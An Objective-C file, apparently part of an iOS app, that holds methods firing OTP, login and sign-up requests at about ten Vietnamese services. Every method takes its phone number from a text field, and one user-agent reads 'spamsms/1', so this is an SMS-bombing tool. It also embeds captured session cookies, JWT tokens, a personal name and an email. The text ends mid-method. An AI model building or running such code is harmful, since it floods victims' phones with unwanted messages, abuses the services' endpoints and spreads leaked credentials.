//
//  apiotp.h
//  xcodeapptesst
//
//  Created by Đỗ Thành on 03/12/2024.
//

#ifndef apiotp_h
#define apiotp_h


#endif /* apiotp_h */
- (void)tv360 {
    
    NSURL *url = [NSURL URLWithString:@"https://tv360.vn/public/v1/auth/get-otp-login"];
    NSDictionary *headers = @{
        @"accept": @"application/json, text/plain, */*",
        @"accept-language": @"vi,en-US;q=0.9,en;q=0.8",
        @"content-type": @"application/json",
        @"cookie": @"device-id=s%3Aweb_895aee42-5dba-4f4c-be50-4a5e2b46a318.5ArsvemU%2BkbaqOOjA9CRRIlvC47i7vpwQI1InZplf0k; shared-device-id=web_895aee42-5dba-4f4c-be50-4a5e2b46a318; screen-size=s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q; G_ENABLED_IDPS=google; img-ext=avif; NEXT_LOCALE=vi; session-id=s%3A0fa8fdac-771b-47bf-bdfd-de08cdf40df4.PLbm2aqLwoKNkwwKKr46Q6b4mK3OtfZDPqLXoNQ%2BB24",
        @"dnt": @"1",
        @"origin": @"https://tv360.vn",
        @"priority": @"u=1, i",
        @"referer": @"https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\"",
        @"sec-fetch-dest": @"empty",
        @"sec-fetch-mode": @"cors",
        @"sec-fetch-site": @"same-origin",
        @"starttime": @"1733153367405",
        @"tz": @"Asia/Saigon",
        @"user-agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
    };

    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"msisdn\":\"%@\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"tv360 Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"tv360 Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}


- (void)viettel_login_dang_nhap {
    
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *urlString = [NSString stringWithFormat:@"https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone=%@&actionCode=myviettel:%%2F%%2Flogin_mobile&typeCode=DI_DONG&type=otp_login", phoneNumber];
    NSURL *url = [NSURL URLWithString:urlString];
    NSDictionary *headers = @{
        @"accept": @"application/json, text/plain, */*",
        @"accept-language": @"vi,en-US;q=0.9,en;q=0.8",
        @"content-length": @"0",
        @"dnt": @"1",
        @"origin": @"https://vietteltelecom.vn",
        @"priority": @"u=1, i",
        @"referer": @"https://vietteltelecom.vn/",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\"",
        @"sec-fetch-dest": @"empty",
        @"sec-fetch-mode": @"cors",
        @"sec-fetch-site": @"cross-site",
        @"user-agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
    };
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    
    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"viettel login Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"viettel login Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)viettel_tao_tai_khoan {
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *urlString = [NSString stringWithFormat:@"https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone=%@&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login", phoneNumber];
    NSURL *url = [NSURL URLWithString:urlString];
    NSDictionary *headers = @{
        @"accept": @"application/json, text/plain, */*",
        @"accept-language": @"vi,en-US;q=0.9,en;q=0.8",
        @"content-length": @"0",
        @"dnt": @"1",
        @"origin": @"https://vietteltelecom.vn",
        @"priority": @"u=1, i",
        @"referer": @"https://vietteltelecom.vn/",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\"",
        @"sec-fetch-dest": @"empty",
        @"sec-fetch-mode": @"cors",
        @"sec-fetch-site": @"cross-site",
        @"user-agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
    };

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"viettel reg Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"viettel reg Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}


-(void)sapo_tao_acc {
    NSURL *url = [NSURL URLWithString:@"https://www.sapo.vn/Register/RegisterTrial"];
    NSDictionary *headers = @{
        @"accept": @"*/*",
        @"accept-language": @"vi,en-US;q=0.9,en;q=0.8",
        @"content-type": @"application/json",
        @"cookie": @"landing_page=https://www.sapo.vn/; start_time=12/03/2024 19:13:15; lang=vi; referral=https://accounts.sapo.vn/; pageview=3",
        @"dnt": @"1",
        @"origin": @"https://www.sapo.vn",
        @"priority": @"u=1, i",
        @"referer": @"https://www.sapo.vn/",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\"",
        @"sec-fetch-dest": @"empty",
        @"sec-fetch-mode": @"cors",
        @"sec-fetch-site": @"same-origin",
        @"user-agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
    };

    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"FullName\":\"Nguyễn Quang Ngọc\",\"StoreName\":\"CTDOTECH\",\"PhoneNumber\":\"%@\",\"City\":\"Hà Nội\",\"PackageTitle\":\"retail_pro_v3\",\"ConfirmPolicy\":true,\"Preferred\":\"\",\"SaleName\":\"\",\"Reference\":\"\",\"Source\":\"https://www.sapo.vn/\",\"Referral\":\"https://accounts.sapo.vn/\",\"Campaign\":\"\",\"LandingPage\":\"https://www.sapo.vn/\",\"StartTime\":\"12/03/2024 19:13:15\",\"EndTime\":\"12/03/2024 19:14:0\",\"PageView\":\"3\",\"AffId\":\"\",\"AffTrackingId\":\"\",\"SalesTeam\":\"\",\"SocialSource\":\"\",\"FacebookName\":\"\",\"FacebookAvatar\":\"\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"sapo Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"sapo Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}



-(void)modcha {
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *urlString = [NSString stringWithFormat:@"https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp?msisdn=%@&languageCode=vi", phoneNumber];
    NSURL *url = [NSURL URLWithString:urlString];
    NSDictionary *headers = @{
        @"Accept": @"application/json, text/plain, */*",
        @"Accept-Language": @"vi,en-US;q=0.9,en;q=0.8",
        @"Connection": @"keep-alive",
        @"Content-Length": @"0",
        @"DNT": @"1",
        @"Origin": @"https://video.mocha.com.vn",
        @"Referer": @"https://video.mocha.com.vn/",
        @"Sec-Fetch-Dest": @"empty",
        @"Sec-Fetch-Mode": @"cors",
        @"Sec-Fetch-Site": @"same-site",
        @"User-Agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\""
    };

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"mocha Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"mocha Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)vieon {
    NSURL *url = [NSURL URLWithString:@"https://api.vieon.vn/backend/user/v2/register?platform=web&ui=012021"];
    NSDictionary *headers = @{
        @"accept": @"application/json, text/plain, */*",
        @"accept-language": @"vi,en-US;q=0.9,en;q=0.8",
        @"authorization": @"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzM0MDI5MjksImp0aSI6IjE2YzZmMzgwZjcyM2ZhOThjMWZiOTBhNjkyOWYzZjE4IiwiYXVkIjoiIiwiaWF0IjoxNzMzMjMwMTI5LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTczMzIzMDEyOCwic3ViIjoiYW5vbnltb3VzX2E3NWEzMmJkYTI5YWZhZGNkNzAxNTA1NDgzZTk1YjRmLWMyM2ViMmE5MDk5YjM4YzM4N2MxODVhN2NmMTRjZWUxLTE3MzMyMzAxMjkiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiYTc1YTMyYmRhMjlhZmFkY2Q3MDE1MDU0ODNlOTViNGYtYzIzZWIyYTkwOTliMzhjMzg3YzE4NWE3Y2YxNGNlZTEtMTczMzIzMDEyOSIsInVhIjoiTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMzEuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiTWFjIE9TIDEwLjE1LjciLCJpc3ByZSI6MCwidmVyc2lvbiI6IiJ9.NO-4lE8TM98g3ZiJU5LLCtfZrn_ePmaZm524P0JhcIE",
        @"content-type": @"application/json",
        @"dnt": @"1",
        @"origin": @"https://vieon.vn",
        @"priority": @"u=1, i",
        @"referer": @"https://vieon.vn/auth/?destination=/&page=/",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\"",
        @"sec-fetch-dest": @"empty",
        @"sec-fetch-mode": @"cors",
        @"sec-fetch-site": @"same-site",
        @"user-agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"username\":\"%@\",\"country_code\":\"VN\",\"model\":\"Mac OS 10.15.7\",\"device_id\":\"a75a32bda29afadcd701505483e95b4f\",\"device_name\":\"Edge/131\",\"device_type\":\"desktop\",\"platform\":\"web\",\"ui\":\"012021\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"vieon Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"vieon Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)fptshop {
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *urlString = [NSString stringWithFormat:@"https://papi.fptshop.com.vn/gw/v1/public/bff-before-order/customer-kyc/customer-policy?phoneNumber=%@", phoneNumber];
    NSURL *url = [NSURL URLWithString:urlString];
    NSDictionary *headers = @{
        @"accept": @"application/json",
        @"accept-language": @"vi,en-US;q=0.9,en;q=0.8",
        @"content-type": @"application/json",
        @"dnt": @"1",
        @"order-channel": @"1",
        @"origin": @"https://fptshop.com.vn",
        @"priority": @"u=1, i",
        @"referer": @"https://fptshop.com.vn/",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\"",
        @"sec-fetch-dest": @"empty",
        @"sec-fetch-mode": @"cors",
        @"sec-fetch-site": @"same-site",
        @"user-agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
    };

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setAllHTTPHeaderFields:headers];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"fptshop Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"fptshop Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)fptshop1 {
    NSURL *url = [NSURL URLWithString:@"https://fptshop.com.vn/api-data/loyalty/Login/SendOtp"];
    NSDictionary *headers = @{
        @"User-Agent": @"spamsms/1 CFNetwork/1474 Darwin/23.0.0",
        @"Content-Type": @"application/json",
        @"accept-language": @"vi-VN,vi;q=0.9"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"phone\":\"%@\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"fptshop1 Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"fptshop1 Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}


-(void)galaxyplay {
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *urlString = [NSString stringWithFormat:@"https://api.glxplay.io/account/phone/verify?phone=%@", phoneNumber];
    NSURL *url = [NSURL URLWithString:urlString];
    NSDictionary *headers = @{
        @"accept": @"*/*",
        @"accept-language": @"vi",
        @"access-token": @"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiJhZDEwNzQ0Ny03ZWU0LTRmM2UtOTNiZC0xMjA3ZDhlN2M5YzQiLCJkaWQiOiI3OWJmN2QzNy1lNGY1LTQ5YjUtOGE0Zi0xZWQ0NzRjNTEyMGMiLCJpcCI6IjE0LjE4OC4xNjguNzYiLCJtaWQiOiJOb25lIiwicGx0Ijoid2VifHBjfG1hY29zfDEwLjE1Ljd8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MzMyMzE3NzksImV4cCI6MTc0ODc4Mzc3OX0.fVDholn7DNtgYVgBEO5JLspoieRRKFferV4dwzkS000",
        @"content-length": @"0",
        @"dnt": @"1",
        @"origin": @"https://galaxyplay.vn",
        @"priority": @"u=1, i",
        @"referer": @"https://galaxyplay.vn/",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\"",
        @"sec-fetch-dest": @"empty",
        @"sec-fetch-mode": @"cors",
        @"sec-fetch-site": @"cross-site",
        @"user-agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
        @"x-requested-with": @"XMLHttpRequest"
    };

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"galaxyplay Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"galaxyplay Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)Shine30 {
    NSURL *url = [NSURL URLWithString:@"https://f9q6qhckw1.execute-api.ap-southeast-1.amazonaws.com/Product/api/v1/auth/verify"];
    NSDictionary *headers = @{
        @"accept": @"application/json",
        @"accept-language": @"vi,en-US;q=0.9,en;q=0.8",
        @"authorization": @"",
        @"content-type": @"application/json",
        @"dnt": @"1",
        @"origin": @"https://30shine.com",
        @"priority": @"u=1, i",
        @"referer": @"https://30shine.com/",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\"",
        @"sec-fetch-dest": @"empty",
        @"sec-fetch-mode": @"cors",
        @"sec-fetch-site": @"cross-site",
        @"user-agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"phone\":\"+84%@\",\"brandName\":\"30SHINE\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"30shine Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"30shine Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)Shine30_test {
    NSURL *url = [NSURL URLWithString:@"https://f9q6qhckw1.execute-api.ap-southeast-1.amazonaws.com/Product/api/v1/auth/verify"];
    NSDictionary *headers = @{
        @"accept": @"application/json",
        @"accept-language": @"vi,en-US;q=0.9,en;q=0.8",
        @"authorization": @"",
        @"content-type": @"application/json",
        @"dnt": @"1",
        @"origin": @"https://30shine.com",
        @"priority": @"u=1, i",
        @"referer": @"https://30shine.com/",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\"",
        @"sec-fetch-dest": @"empty",
        @"sec-fetch-mode": @"cors",
        @"sec-fetch-site": @"cross-site",
        @"user-agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
    };
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"{\"phone\":\"%@\",\"brandName\":\"30SHINE\"}", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"30shine1 Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"30shine1 Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}


-(void)cathay {
    NSURL *url = [NSURL URLWithString:@"https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/sendOTP"];
    NSDictionary *headers = @{
        @"Accept": @"*/*",
        @"Accept-Language": @"vi,en-US;q=0.9,en;q=0.8",
        @"Connection": @"keep-alive",
        @"Content-Type": @"application/x-www-form-urlencoded;charset=UTF-8",
        @"Cookie": @"JSESSIONID=HemkG8eegZeYl74jF68Jvy7r.06283f0e-f7d1-36ef-bc27-6779aba32e74; TS01f67c5d=0110512fd7f4d8abef0536831b176fd2c83031da1443d2505092816d576f20a3cc8843ffc0444d5422bf62090d0a8587ab695e1294; BIGipServerB2C_http=!BGbZIw6gQQqZ2NTRrhDcHTnwa9KJ8bDNPsPAe/lWgfa4TqRfryy5ODHpD+XOcAW+PRM6o3ZHq0lK7Q==; TS0173f952=0110512fd7f4d8abef0536831b176fd2c83031da1443d2505092816d576f20a3cc8843ffc0444d5422bf62090d0a8587ab695e1294; dtCookies05g7k3y=v_4_srv_1_sn_CB1F80CDF6A5A941EC65D564DA8D7B54_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; INITSESSIONID=31c75d53acba3f7e772afe3f6cd4ebed",
        @"DNT": @"1",
        @"Origin": @"https://www.cathaylife.com.vn",
        @"Referer": @"https://www.cathaylife.com.vn/CPWeb/portal/register",
        @"Sec-Fetch-Dest": @"empty",
        @"Sec-Fetch-Mode": @"cors",
        @"Sec-Fetch-Site": @"same-origin",
        @"User-Agent": @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
        @"X-Requested-With": @"XMLHttpRequest",
        @"sec-ch-ua": @"\"Microsoft Edge\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        @"sec-ch-ua-mobile": @"?0",
        @"sec-ch-ua-platform": @"\"macOS\""
    };

    
    NSString *phoneNumber = self.phoneTextField.text;
    NSString *jsonString = [NSString stringWithFormat:@"phone=%@", phoneNumber];
    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[@"&email=nqndev123%40gmail.com" dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[@"&LINK_FROM=signUp2" dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[@"&CUSTOMER_NAME=Nguy%E1%BB%85n+Quang+Ng%E1%BB%8Dc" dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[@"&memberID=" dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[@"&POL_HOLDER_NUM=undefined" dataUsingEncoding:NSUTF8StringEncoding]];
    [data appendData:[@"&LANGS=vi_VN" dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setAllHTTPHeaderFields:headers];
    [request setHTTPBody:data];

    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            [self logMessage:[NSString stringWithFormat:@"cathay Error: %@", error.localizedDescription]];
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
            [self logMessage:[NSString stringWithFormat:@"cathay Response: %ld", (long)httpResponse.statusCode]];
        }
    }];
    [dataTask resume];
}

-(void)dominos {
    NSURL *url = [NSURL URLWithString:@"https://dominos.vn/api/v1/users/send-otp"];
    NSDictionary *headers = @{
        @"accept": @"application/json, text/plain, */*",
        @"accept-language": @"vi",
        @"content-type": @"application/json",
        @"dmn": @"DRRIBR",
        @"dnt": @"1",
        @"origin": @"https://dominos.vn",
        @"priority": @"u=1, i",
        @"referer": @"https://dominos.vn/",
